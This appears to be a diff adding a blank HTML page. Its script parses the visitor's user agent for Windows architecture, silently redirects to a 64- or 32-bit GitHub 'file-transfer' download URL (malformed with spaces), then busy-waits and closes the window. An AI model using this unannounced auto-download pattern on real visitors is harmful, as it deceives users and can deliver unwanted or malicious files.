@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html>
+<head></head>
+<body>
+    
+    <img src="#">
+    
+<script>
+
+function sleep(milliseconds) {
+  const date = Date.now();
+  let currentDate = null;
+  do {
+    currentDate = Date.now();
+  } while (currentDate - date < milliseconds);
+}   
+
+    infos=navigator.userAgent;
+    var pos = infos.indexOf("Windows");
+    windowsVer ="";
+    bitType=""
+    console.log(infos[pos]);
+    
+    while(infos[pos]!=';')
+    {
+        windowsVer+=infos[pos];
+        pos++;
+    }
+    pos+=2;
+    while(infos[pos]!=';')
+    {
+        bitType+=infos[pos];
+        pos++;
+    }
+    
+    if(bitType=="Win64")
+    {
+        document.location.href = 'https://github.com/file-transfer 64';
+    }
+    else
+    {
+        document.location.href = 'https://github.com/file-transfer 86';
+    }
+    sleep(2000);
+    window.close();
+</script>
+    
+</body> 
+</html>
